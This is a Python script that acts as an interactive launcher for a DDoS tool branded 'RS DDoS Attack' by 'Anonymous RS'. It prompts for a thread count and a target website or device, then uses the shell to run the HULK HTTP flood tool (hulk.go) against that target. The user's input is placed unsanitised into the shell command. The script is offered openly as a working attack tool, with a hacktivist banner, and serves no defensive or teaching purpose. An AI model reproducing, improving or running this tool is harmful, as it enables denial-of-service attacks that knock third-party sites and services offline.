from colorama import Fore, Back, Style, init
import os
import pyttsx3
import platform
import subprocess

init(autoreset=True)

def say_stuff(stuff_to_say):
    engine = pyttsx3.init()
    engine.say(str(stuff_to_say))
    engine.runAndWait()

def run_command(command):
    try:
        subprocess.run(command, shell=True, check=True)
    except subprocess.CalledProcessError as e:
        print(f"[+] Error executing command: {e}")

def install_dependencies():
    print('[+] Installing Dependencies')
    run_command('pip install -r requirements.txt')

# Banner display
try:
    from pyfiglet import figlet_format
    print(Fore.GREEN + Back.BLACK + figlet_format("RS DDoS Attack"))
except ImportError:
    print(Fore.GREEN + Back.BLACK + "[ RS DDoS Attack ]")

# Main interactive menu
print(Back.GREEN + Fore.GREEN + '[+] RS DDoS tool by' + Fore.RED + ' Anonymous RS')
print(Back.GREEN + Fore.BLACK + '[+] RS-DDoS Tool enhanced VERSION 2.O')
print(Back.BLACK + Fore.GREEN + '[+] RS-DDoS Tool Interactive Menu in Python by anonymous')
print(Fore.YELLOW + '[+] We are Anonymous, We do not Forgive, We are Dangerous')
print(Fore.GREEN + '[+] Starting RS DoS Tool with 10240 Baseline Threads as Default, change below as Required')
print(Fore.BLUE + 'Author: ' + Fore.GREEN + 'AnonymousRS (anonymous)')
print('Your OS: ' + Fore.RED + str(platform.system()) + Fore.GREEN)

try:
    threads = input('[+] ENTER THE NUMBER OF' + Fore.BLUE + ' THREADS ' + Fore.GREEN + 'FOR DDoS >>> ')
    site = input(Fore.BLUE + '[+] Enter the Site that You want to' + Fore.RED + ' DDoS ' + Fore.GREEN + '>>> ')
    colab_status = input(Fore.YELLOW + 'Are you DDoS with Google Colab [Y/N] ').upper()
    attack_severity = input('[+] Enter' + Fore.RED + ' 1' + Fore.GREEN + ' For a Very Small' + Fore.RED + ' Target' + Fore.GREEN + ' Like a Device and' + Fore.YELLOW + ' 2 ' + Fore.GREEN + ' for a ' + Fore.YELLOW + 'Website ' + Fore.GREEN + ' >>> ')

    if colab_status == 'N' and platform.system() != 'Linux':
        say_stuff(f"Attacking your Target Website {site} with {threads} Threads")

    print('[+] Executing Command as Follows')
    command = f'HULKMAXPROCS={threads} go run hulk.go -site {site}'
    print(Fore.GREEN + command)

    if 'Windows' in platform.system():
        run_command(f'go run hulk.go -site {site}')
    else:
        run_command(f'HULKMAXPROCS={threads} go run hulk.go -site {site}')

except Exception as e:
    print(f'[+] Execution Stopped with Error: {e}')
    install_dependencies()